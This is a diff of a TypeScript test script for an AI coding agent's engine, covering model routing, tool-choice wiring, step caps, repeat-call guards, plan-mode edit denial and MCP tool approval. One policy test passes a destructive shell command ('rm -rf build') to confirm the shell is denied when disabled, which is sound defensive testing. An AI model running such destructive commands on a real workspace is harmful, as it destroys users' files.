-      secrets: { getKeys: async (p: string) => store.get(p) ?? [], isToolIncompatible: () => false } as never,
-    });
-    store.set('groq', ['gsk-live']);
-
-    const sel = await selectModel([], { pinnedModel: 'groq::openai/gpt-oss-120b' });
-    ok('F. pinned model is the selection', sel.model === 'groq::openai/gpt-oss-120b', JSON.stringify(sel));
-    ok('F. pinned selection has NO failover depth', sel.fallbackChain.length === 0,
-      `fallbackChain=${JSON.stringify(sel.fallbackChain)}`);
-    ok('F. pinned rationale names only the pin',
-      sel.rationale?.entries.length === 1 && sel.rationale.entries[0].selected === true,
-      JSON.stringify(sel.rationale));
-
-    // An unroutable pin (no key for its platform) must NOT silently reroute either —
-    // empty selection plus the skip reason, which resolveCandidates surfaces as the
-    // turn's error message.
-    const dead = await selectModel([], { pinnedModel: 'ollama::glm-5.2' });
-    ok('F. unroutable pin yields no candidate', dead.model === '' && dead.fallbackChain.length === 0,
-      JSON.stringify(dead));
-    ok('F. unroutable pin reports its skip reason',
-      !!dead.rationale?.entries[0]?.skip && !dead.rationale.picked, JSON.stringify(dead.rationale));
-
-    // 'auto' is the webview selector's DEFAULT value (media/src/main.ts `let currentModel =
-    // 'auto'`) and flows here as pinnedModel on every default Auto send — it means "no pin".
-    // The pin-runs-alone branches above must not treat it as an unroutable pin: without the
-    // guard this returned an empty selection and resolveCandidates killed every Auto turn
-    // with "Pinned model auto could not run: no API key stored for this platform" (repro'd
-    // 2026-09-01, caught in the pre-release scan).
-    const autoSel = await selectModel([], { pinnedModel: 'auto' });
-    ok('F. pinnedModel "auto" is not a pin — normal routing still happens',
-      autoSel.model.length > 0 && autoSel.fallbackChain.length >= 2, JSON.stringify(autoSel));
-    const { resolveCandidates } = await import('../src/agent/core/routerProvider');
-    try {
-      const autoChain = await resolveCandidates({ pinnedModel: 'auto' } as never);
-      ok('F. resolveCandidates serves Auto (no pin error)', autoChain.length > 0,
-        JSON.stringify(autoChain.map((c) => `${c.platform}::${c.modelId}`)));
-    } catch (e) {
-      ok('F. resolveCandidates serves Auto (no pin error)', false, (e as Error).message);
-    }
-
-    // No pin at all → table first, then the enabled tail.
-    const sel2 = await selectModel([], {});
-    ok('F. unpinned selection also has depth', sel2.model.length > 0 && sel2.fallbackChain.length >= 2,
-      JSON.stringify(sel2));
-
-    // requireTools: catalog models marked supportsTools=false must be skipped — they deflect
-    // instead of calling tools.
-    const toolSel = await selectModel([], { requireTools: true });
-    ok('F. requireTools skips non-tool models',
-      toolSel.model !== 'kilo::kimi-k2' && !toolSel.fallbackChain.includes('kilo::kimi-k2'),
-      JSON.stringify(toolSel));
-    setModelSources(undefined as never);
-
-    // Tail ordering: rank-sorted (best first), NOT raw settings order — a paper-strong model
-    // sitting first in settings order used to serve every task after the table ids went dead.
-    setModelSources({
-      catalog: { find: (_p: string, m: string) => ({ supportsTools: true, intelligenceRank: m === 'a-model' ? 1 : m === 'b-model' ? 2 : 3, speedRank: 1 }) } as never,
-      settings: {
-        getFallback: () => [
-          { platform: 'p1', modelId: 'c-model', enabled: true, priority: 0 },
-          { platform: 'p1', modelId: 'b-model', enabled: true, priority: 1 },
-          { platform: 'p1', modelId: 'a-model', enabled: true, priority: 2 },
-        ],
-        getDisabledProviders: () => [],
-        // Mirrors the real SettingsStore: per-model `enabled` AND the provider-level switch.
-        enabledByPriority(): Array<{ platform: string; modelId: string; enabled: boolean; priority: number }> {
-          const off = new Set(this.getDisabledProviders());
-          return this.getFallback().filter((e) => e.enabled && !off.has(e.platform)).sort((a, b) => a.priority - b.priority);
-        },
-      } as never,
-      secrets: { getKeys: async () => ['k'], isToolIncompatible: () => false } as never,
-    });
-    const sel3 = await selectModel([], {});
-    ok('F. tail ordered by intelligence rank, not settings order',
-      sel3.model === 'p1::a-model'
-      && sel3.fallbackChain[0] === 'p1::b-model' && sel3.fallbackChain[1] === 'p1::c-model',
-      JSON.stringify(sel3));
-
-    // "Why this model?" rationale must ride on the selection (the footer's (?) button renders
-    // a popover from it — v3 selection used to produce nothing, so the button was dead).
-    const rat = sel3.rationale;
-    ok('F. selection carries a rationale report',
-      !!rat && rat.picked === 'p1::a-model' && rat.entries.length >= 3,
-      JSON.stringify(rat));
-    ok('F. rationale marks the served model and numeric fields are popover-safe',
-      !!rat && rat.entries[0].selected === true && Number.isFinite(rat.entries[0].score)
-      && typeof rat.entries[0].reason === 'string' && rat.entries[0].reason.length > 0,
-      JSON.stringify(rat?.entries[0]));
-    const skipRow = rat?.entries.find((e) => e.skip);
-    ok('F. skipped candidates carry a reason (or none exist)', skipRow === undefined || (typeof skipRow.skip === 'string' && skipRow.skip.length > 0),
-      JSON.stringify(skipRow));
-    setModelSources(undefined as never);
-
-    // A model picked BY THE TASK TABLE keeps its table label — the enabled-tail loop used to
-    // re-pick the same key with the generic 'enabled model' label and overwrite the popover's
-    // why (live repro: table-picked opencode/hy3-free showed "enabled model — serves this turn").
-    setModelSources({
-      catalog: { find: (_p: string, m: string) => (m === 'gemini-2.5-flash' ? { supportsTools: true, intelligenceRank: 1, speedRank: 1 } : undefined) } as never,
-      settings: {
-        getFallback: () => [{ platform: 'google', modelId: 'gemini-2.5-flash', enabled: true, priority: 0 }],
-        getDisabledProviders: () => [],
-        // Mirrors the real SettingsStore: per-model `enabled` AND the provider-level switch.
-        enabledByPriority(): Array<{ platform: string; modelId: string; enabled: boolean; priority: number }> {
-          const off = new Set(this.getDisabledProviders());
-          return this.getFallback().filter((e) => e.enabled && !off.has(e.platform)).sort((a, b) => a.priority - b.priority);
-        },
-      } as never,
-      secrets: { getKeys: async () => ['k'], isToolIncompatible: () => false } as never,
-    });
-    const selT = await selectModel([], { taskKind: 'vision' }); // vision table = [google::gemini-2.5-flash]
-    ok('F. task-table pick keeps its table label in the rationale',
-      selT.model === 'google::gemini-2.5-flash' && !!selT.rationale
-      && selT.rationale.entries[0].reason.startsWith('task table (vision)'),
-      JSON.stringify(selT.rationale?.entries[0]));
-    setModelSources(undefined as never);
-
-    // Web tools (restored) are offered in every mode.
-    const { buildV3ToolSet } = await import('../src/agent/core/tools/v3');
-    const agentTools = buildV3ToolSet('agent');
-    ok('F. webSearch + fetchUrl offered in agent mode', 'webSearch' in agentTools && 'fetchUrl' in agentTools);
-    // A finished tool's OUTPUT must reach the host as ToolEvent.detail. It was dropped at
-    // engine.ts's onStepEnd until 2026-09-01, which left every non-edit tool card rendering an
-    // empty body behind its "View output" disclosure, and made crash recovery persist tool
-    // calls with blank results ({ role: 'tool', content: e.detail ?? '' }).
-    {
-      const ws = makeWorkspace();
-      const outModel = createMockModel([
-        { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-        { text: 'done' },
-      ], 'tool-detail');
-      const seenTools: Array<{ name?: string; state?: string; detail?: string }> = [];
-      await runWithWorkspaceRoot(ws.root, () => engineTurn(outModel, engineOpts({
-        messages: [{ role: 'user', content: 'read foo.txt' }],
-        onTool: (e: { name?: string; state?: string; detail?: string }) => seenTools.push(e),
-      })));
-      const doneEvent = seenTools.find((e) => e.name === 'readFile' && e.state === 'done');
-      ok('F. a finished tool carries its output as detail',
-        !!doneEvent?.detail && doneEvent.detail.length > 0, JSON.stringify(doneEvent));
-      ok('F. the running event carries no detail yet',
-        seenTools.find((e) => e.name === 'readFile' && e.state === 'running')?.detail === undefined);
-    }
-
-    // toolChoice must actually REACH the provider. RouteOptions has carried `tool_choice` and
-    // openai-compat.ts has put it on the wire all along, but the LanguageModelV4 adapter never
-    // populated it from the SDK's call options — so every forced tool call the engine set up
-    // (the plan-gap continuation's whole guarantee) was dropped at that boundary, for every
-    // provider. Live repro 2026-09-01 5:27 PM: forced step, no plan, narration shipped.
-    const { toRouterToolChoice } = await import('../src/agent/core/routerProvider');
-    ok('F. toolChoice "required" reaches the router wire', toRouterToolChoice({ type: 'required' }) === 'required');
-    ok('F. a pinned tool maps to the function shape',
-      JSON.stringify(toRouterToolChoice({ type: 'tool', toolName: 'exitPlanMode' }))
-        === '{"type":"function","function":{"name":"exitPlanMode"}}',
-      JSON.stringify(toRouterToolChoice({ type: 'tool', toolName: 'exitPlanMode' })));
-    ok('F. auto/none pass through, unset stays unset',
-      toRouterToolChoice({ type: 'auto' }) === 'auto' && toRouterToolChoice({ type: 'none' }) === 'none'
-      && toRouterToolChoice(undefined) === undefined);
-
-    // Ask mode is gone (modes are 'plan' | 'agent'); its read-only Q&A surface lives on in
-    // plan mode, whose toolset still withholds the editors and whose policy still denies them.
-    const planTools = buildV3ToolSet('plan');
-    ok('F. web tools offered in plan mode too', 'webSearch' in planTools && 'fetchUrl' in planTools);
-    ok('F. plan mode still has no editors',
-      !('editFile' in planTools) && !('writeFile' in planTools) && !('deleteFile' in planTools));
-    const planHardPolicy = { ...prodDefaultPolicy, sessionMode: 'plan' as const, mode: 'full-auto' as const, alwaysAllow: new Set(['editFile']), alwaysDeny: new Set<string>() };
-    const planEdit = await resolvePolicy({ toolName: 'editFile' }, planHardPolicy);
-    ok('F. edits hard-denied in plan mode even under full-auto + alwaysAllow',
-      (planEdit as { type: string }).type === 'denied', JSON.stringify(planEdit));
-    gone('F. read-only shell auto-ran in ask mode', 'ask mode removed (modes are plan | agent)');
-    gone('F. destructive shell hard-denied in ask mode', 'ask mode removed (modes are plan | agent)');
-    gone('F. ambiguous shell asked in ask mode', 'ask mode removed (modes are plan | agent)');
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'read_files', input: { files: [{ path: ws.file('foo.txt') }] } }] },
+    ], { maxStepsPerTurn: 2 });
+    ok('10a. paused, not failed', r.result.paused === true && !r.result.failed, JSON.stringify({ paused: r.result.paused, failed: r.result.failed }));
+    ok('10b. no error notice for the cap', r.errors.length === 0, r.errors.join(' | '));
   }
 
-  // ── Scenario 26: a turn cut by the STEP CAP must say so ─────────────────────
-  // Before 2026-09-05 the cap ended the turn with paused: undefined, indistinguishable from a
-  // finished one — no Continue button, no explanation. docs/AGENT_RELIABILITY_PLAN_2026-09-05.md §0.1.
+  console.log('— 11. a provider failure is an honest failed result —');
   {
-    const ws = makeWorkspace();
-    // Distinct SUCCEEDING calls, so this exercises the cap and not the no-progress guard.
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'bar.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'bar.txt' } }] },
-      { text: 'never reached — the cap stops the turn first' },
-    ], 's26');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'keep reading' }],
-      mode: 'agent',
-      maxStepsPerTurn: 4,
-    })));
-    ok('26. the cap actually bound the turn', model.calls.length === 4, `calls=${model.calls.length}`);
-    gone('26. a capped turn is RESUMABLE, not a silent success', 'pause/resume contract not wired on the cline branch yet');
-    gone('26. and it names the reason', 'stopReason budget/stuck taxonomy is old-engine; Cline caps iterations itself');
-    ok('26. the work done so far is preserved for the resume',
-      (out.workMessages?.length ?? 0) > 0, `workMessages=${out.workMessages?.length}`);
+    const ws = workspace();
+    const r = await turn(ws.root, [{ finishError: { error: 'invalid api key', errorClass: 'auth', errorRetryable: false } }]);
+    ok('11a. failed with the message', r.result.failed === true && /invalid api key/.test(r.result.errorMessage ?? ''), r.result.errorMessage);
+    ok('11b. the error reached the UI', r.errors.some((e) => /invalid api key/.test(e)));
   }
 
-  // ── Scenario 26b: maxStepsPerTurn is a real setting, not decoration ──────────
+  console.log('— 12. reasoning streams incrementally —');
   {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'bar.txt' } }] },
-      { text: 'done within the budget' },
-    ], 's26b');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read both' }],
-      mode: 'agent',
-      maxStepsPerTurn: 10,
-    })));
-    ok('26b. a turn that finishes inside the cap is NOT marked paused',
-      out.paused !== true && out.stopReason === undefined, `paused=${out.paused} stopReason=${out.stopReason}`);
-    ok('26b. and finishes normally', out.finishReason === 'stop', `finish=${out.finishReason}`);
+    const ws = workspace();
+    const r = await turn(ws.root, [{ reasoningDeltas: ['first ', 'second ', 'third'], text: 'answer' }]);
+    ok('12a. three reasoning deltas, not one dump', r.reasoning.length >= 3, String(r.reasoning.length));
+    ok('12b. the result carries the whole reasoning', r.result.reasoning === 'first second third', r.result.reasoning);
   }
 
-  // ── Scenario 27: a model repeating one FAILING call stops instead of thrashing ─
-  // v3 tools never throw — they return `{ error }` — so a failing edit looked like an ordinary
-  // result to everything. A model could re-issue the identical call until the step cap, burning
-  // 50 free-tier requests for zero work. §0.2.
+  console.log('— 13. the persisted transcript round-trips into Cline\'s seed —');
   {
-    const ws = makeWorkspace();
-    const bad = { path: 'foo.txt', search: 'this text is not in the file', replace: 'x' };
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { text: 'never reached' },
-    ], 's27');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'edit foo.txt' }],
-      mode: 'agent',
-      autoApprove: true,
-      maxStepsPerTurn: 50,
-    })));
-    gone('27. stopped at the third identical failure, not at the step cap', 'repeat-failure guard is old-engine; Cline runs its own mistake limit');
-    if (false) ok('27. stopped at the third identical failure, not at the step cap',
-      model.calls.length === 3, `calls=${model.calls.length}`);
-    gone('27. the turn is resumable rather than silently over', 'pause/resume not wired');
-    gone('27. and reports WHY it stopped', 'stopReason taxonomy is old-engine');
-    ok('27. the file was never touched', ws.read('foo.txt') === 'hello world', ws.read('foo.txt'));
-  }
-
-  // ── Scenario 27b: a SUCCESS clears the streak — retrying is not thrashing ────
-  {
-    const ws = makeWorkspace();
-    const bad = { path: 'foo.txt', search: 'absent text', replace: 'x' };
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'fixed' } }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { toolCalls: [{ toolName: 'editFile', input: bad }] },
-      { text: 'recovered, then explored again' },
-    ], 's27b');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'edit foo.txt' }],
-      mode: 'agent',
-      autoApprove: true,
-      maxStepsPerTurn: 50,
-    })));
-    ok('27b. two failures then progress does NOT trip the guard',
-      model.calls.length === 6 && out.stopReason === undefined,
-      `calls=${model.calls.length} stopReason=${out.stopReason}`);
-    ok('27b. the successful edit applied', ws.read('foo.txt') === 'fixed world', ws.read('foo.txt'));
-  }
-
-  // ── Scenario 27c: an identical READ repeated is served from cache, then stops the turn ──
-  // Live repro 2026-09-06: grep "distance" 15× and the same readFile 8× in one turn, three
-  // minutes, no answer. The second copy gets the earlier result back with a note; the fourth
-  // pauses the turn as stuck. A different read in between is real work and is not counted.
-  {
-    const ws = makeWorkspace();
-    const same = { path: 'foo.txt' };
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt', offset: 1, limit: 1 } }] },
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { text: 'never reached' },
-    ], 's27c');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'what is in foo.txt' }],
-      mode: 'agent',
-      autoApprove: true,
-      maxStepsPerTurn: 50,
-    })));
-    const results = out.workMessages?.filter((m) => m.role === 'tool').map((m) => String(m.content)) ?? [];
-    gone('27c. the second identical read is answered from cache with a note', 'dedupeReads read-cache is old-engine');
-    if (false) ok('27c. the second identical read is answered from cache with a note',
-      results[1]?.includes('Identical readFile call #2') && results[1]?.includes('hello world'), results[1]?.slice(0, 80));
-    // Every copy carries the content, not just the second: ageToolOutputs elides an older tool
-    // result and tells the model to re-run to see it again, so a cached answer that withheld the
-    // content left it blind to a file it had already read (2026-09-16).
-    gone('27c. later copies still carry the content', 'dedupeReads read-cache is old-engine');
-    if (false) ok('27c. later copies still carry the content',
-      !!results[3] && results[3].includes('#3') && results[3].includes('hello world'), results[3]?.slice(0, 80));
-    gone('27c. the fourth identical read pauses the turn as stuck', 'dedupe cache + stuck pause are old-engine');
-    if (false) ok('27c. the fourth identical read pauses the turn as stuck',
-      out.stopReason === 'stuck' && out.paused === true && model.calls.length === 5, `calls=${model.calls.length} stopReason=${out.stopReason}`);
-  }
-
-  // ── Scenario 27e: an EDIT invalidates the read cache ────────────────────────
-  // Live repro 2026-09-16: a blade file was read, edited, re-read — and the re-read returned the
-  // PRE-EDIT content with "the result is unchanged", so the model redid the same fix for 24
-  // minutes. A read after a write is not a repeat; only reads with nothing in between are.
-  {
-    const ws = makeWorkspace();
-    const same = { path: 'foo.txt' };
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: same }] },
-      { text: 'done' },
-    ], 's27e');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'fix foo.txt' }],
-      mode: 'agent',
-      autoApprove: true,
-      maxStepsPerTurn: 50,
-    })));
-    const results = out.workMessages?.filter((m) => m.role === 'tool').map((m) => String(m.content)) ?? [];
-    const reread = results[results.length - 1] ?? '';
-    ok('27e. the re-read after an edit is NOT served from the cache', !reread.includes('Identical'), reread.slice(0, 80));
-    ok('27e. and it shows the edited content', reread.includes('goodbye'), reread.slice(0, 80));
-    ok('27e. the turn is not marked stuck', out.stopReason === undefined, String(out.stopReason));
-  }
-
-  // ── Scenario 15b: a CONTINUE inherits the task list ─────────────────────────
-  // Repro 2026-09-07: a todo-driven turn hit the 50-step cap; Continue started a fresh turn
-  // whose transcript no longer carried the todoWrite result, so the list was gone from both
-  // the model's context and the UI.
-  {
-    const ws = makeWorkspace();
-    const carried = [
-      { content: 'Add the validation', status: 'completed' as const },
-      { content: 'Update the call sites', status: 'in_progress' as const },
-      { content: 'Add a regression test', status: 'pending' as const },
+    const chat: ChatMessage[] = [
+      { role: 'user', content: 'read foo' },
+      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'read_files', arguments: '{"files":[{"path":"/x/foo.txt"}]}' } }] },
+      { role: 'tool', content: 'hello world', tool_call_id: 'c1' },
+      { role: 'assistant', content: 'it says hello world' },
     ];
-    const m = createMockModel([{ text: 'picking up where I stopped' }], 's15b');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'Continue from where you left off.' }],
-      mode: 'agent',
-      todos: carried,
-    })));
-    // cline branch: the system prompt travels via request.systemPrompt, not a system message.
-    const sys = String((m.calls[0] as { systemPrompt?: string })?.systemPrompt ?? '');
-    ok('15b. the carried list reaches the resumed turn', sys.includes('<task_list>'), sys.slice(-120));
-    ok('15b. unfinished items are named', sys.includes('Update the call sites') && sys.includes('Add a regression test'));
-    ok('15b. finished ones are marked done, not dropped', sys.includes('[x] Add the validation'));
-    ok('15b. and it says not to restart them', sys.includes('Do not restart finished items'));
-
-    // An all-done list must never leak into unrelated later work.
-    const m2 = createMockModel([{ text: 'new task' }], 's15b-done');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m2, engineOpts({
-      messages: [{ role: 'user', content: 'something else entirely' }],
-      mode: 'agent',
-      todos: [{ content: 'Add the validation', status: 'completed' as const }],
-    })));
-    const sys2 = String((m2.calls[0]?.messages ?? []).find((x: { role?: string }) => x.role === 'system')?.content ?? '');
-    ok('15b. a fully completed list is not injected', !sys2.includes('<task_list>'));
-
-    const m3 = createMockModel([{ text: 'plain' }], 's15b-none');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m3, engineOpts({
-      messages: [{ role: 'user', content: 'hello' }], mode: 'agent',
-    })));
-    const sys3 = String((m3.calls[0]?.messages ?? []).find((x: { role?: string }) => x.role === 'system')?.content ?? '');
-    ok('15b. no list, no block', !sys3.includes('<task_list>'));
+    const back = agentToChatMessages(chatToAgentMessages(chat, { n: 0 }));
+    ok('13a. lossless', JSON.stringify(back) === JSON.stringify(chat), JSON.stringify(back));
   }
 
-  // ── Scenario 27d: the TODO AUDIT — dropped with the old engine ────────────────
-  // The user chose to drop the auditTodos gate permanently on the cline branch: the runtime's
-  // own completion machinery (completionPolicy) owns end-of-turn behavior now, and the host
-  // never judges answer quality (SIMPLE_CORE_RESET). The todo LIST itself (todoWrite +
-  // injection) is covered by scenario 15/15b.
-  {
-    gone('27d. the auditor was asked about the completed todo', 'auditTodos gate dropped with the old engine');
-    gone('27d. a missing-evidence verdict is reported', 'auditTodos gate dropped with the old engine');
-    gone('27d. and the turn got ONE more pass with the verdict', 'auditTodos gate dropped with the old engine');
-    gone('27d. a verified audit adds no pass', 'auditTodos gate dropped with the old engine');
-    gone('27d. auditTodos:false disables it', 'setting removed with the gate');
-  }
-
-  // ── Scenario 28: the VERIFY GATE and the WORK REPORT — dropped with the old engine ──
-  // The user chose to drop both permanently on the cline branch: verifyCommand/fix rounds and
-  // workReport/ResultCard never ran in the v3 era anyway (zero callers), and the webview now
-  // keeps only stripLegacyMarkdown for replaying old sessions. Candidate for a future Cline
-  // plugin if the need returns.
-  {
-    gone('28. the verify gate ran and passed', 'verify gate dropped with the old engine');
-    gone('28. a work report is produced at all (it never was before)', 'workReport generation dropped with the old engine');
-    gone('28b. a persistent failure is reported as failed', 'verify gate dropped with the old engine');
-    gone('28b. the fix rounds are BOUNDED by the setting', 'verifyFixRounds setting removed');
-    gone('28c. a read-only turn runs no verify command', 'verify gate dropped with the old engine');
-    gone('28c. and produces no work report', 'workReport generation dropped with the old engine');
-  }
-
-  // ── Scenario 29: `commandApproval: "never"` DISABLES the shell ───────────────
-  // package.json says "Disable terminal command execution entirely"; policyFromSettings used to
-  // fold it into full-auto, so the setting that switches the shell OFF auto-approved every
-  // command with no prompt. Found 2026-09-05 while wiring the verify gate.
-  {
-    const off = { ...prodDefaultPolicy, mode: 'full-auto' as const, shellDisabled: true };
-    const v = await resolvePolicy({ toolName: 'runCommand', input: { command: 'rm -rf build' } }, off);
-    ok('29. shell is DENIED under commandApproval "never", even in full-auto',
-      (v as { type: string }).type === 'denied', JSON.stringify(v));
-    const stillEdits = await resolvePolicy({ toolName: 'editFile', input: { path: 'a.ts' } }, off);
-    ok('29. and only the SHELL is disabled — file tools are unaffected',
-      (stillEdits as { type: string }).type === 'approved', JSON.stringify(stillEdits));
-    const onPolicy = policyFromSettings(false, 'agent', 's29');
-    ok('29. policyFromSettings leaves the shell enabled by default', onPolicy.shellDisabled === false,
-      String(onPolicy.shellDisabled));
-  }
-
-  // ── Scenario 30: MCP server tools actually reach the model ──────────────────
-  // `createMcpTools` shipped with NO caller for the whole v3 era: servers connected,
-  // "Reconnect MCP Servers" worked, `tiermux.mcpServers` was documented — and buildV3ToolSet
-  // had no MCP branch, so the model was never shown one of their tools. Found by a
-  // reachability sweep, 2026-09-05.
-  {
-    const fakeMcp = {
-      listToolSpecs: () => ([{
-        type: 'function' as const,
-        function: {
-          name: 'mcp__docs__search',
-          description: '[MCP:docs] Search the docs',
-          parameters: { type: 'object', properties: { q: { type: 'string' } } },
-        },
-      }]),
-      callTool: async (name: string, argsJson: string) => `called ${name} with ${argsJson}`,
-      isMcpTool: (n: string) => n === 'mcp__docs__search',
-    };
-    setMcpManager(fakeMcp as never);
-    try {
-      const agentTools = Object.keys(buildV3ToolSet('agent'));
-      ok('30. an MCP tool is offered in agent mode', agentTools.includes('mcp__docs__search'), agentTools.join(','));
-      ok('30. the built-ins are still all there', agentTools.includes('readFile') && agentTools.includes('editFile'));
-
-      // Plan mode deliberately does NOT get them: an MCP tool's capability is unknowable and
-      // plan mode's policy would deny it anyway.
-      ok('30. plan mode does not offer MCP tools', !Object.keys(buildV3ToolSet('plan')).includes('mcp__docs__search'));
-
-      // Not read-only ⇒ the normal approval chain asks first. Right default for a tool whose
-      // code lives outside this repo.
-      const verdict = await resolvePolicy({ toolName: 'mcp__docs__search' },
-        { ...prodDefaultPolicy, mode: 'ask' as const },
-        async () => 'allow');
-      ok('30. an MCP tool is gated by approval, not auto-run',
-        (verdict as { type: string }).type === 'approved', JSON.stringify(verdict));
-      const denied = await resolvePolicy({ toolName: 'mcp__docs__search' },
-        { ...prodDefaultPolicy, mode: 'ask' as const }, async () => 'deny');
-      ok('30. and a refusal blocks it', (denied as { type: string }).type === 'denied', JSON.stringify(denied));
-    } finally {
-      setMcpManager(undefined as never);
-    }
-    ok('30. no MCP manager ⇒ no MCP tools, no crash',
-      !Object.keys(buildV3ToolSet('agent')).some((k) => k.startsWith('mcp__')));
-  }
-
-  console.log(failures === 0 ? '\nALL 32 FOUNDATION SCENARIOS PASS — gate open for steps 9-10' : `\n${failures} FAILURE(S) — FOUNDATION GATE BLOCKED, adapt the plan before deleting`);
+  console.log(failures === 0 ? '\nALL PASS' : `\n${failures} FAILURE(S)`);
   process.exit(failures === 0 ? 0 : 1);
 }
 
-void main();
+main().catch((e) => { console.error(e); process.exit(1); });
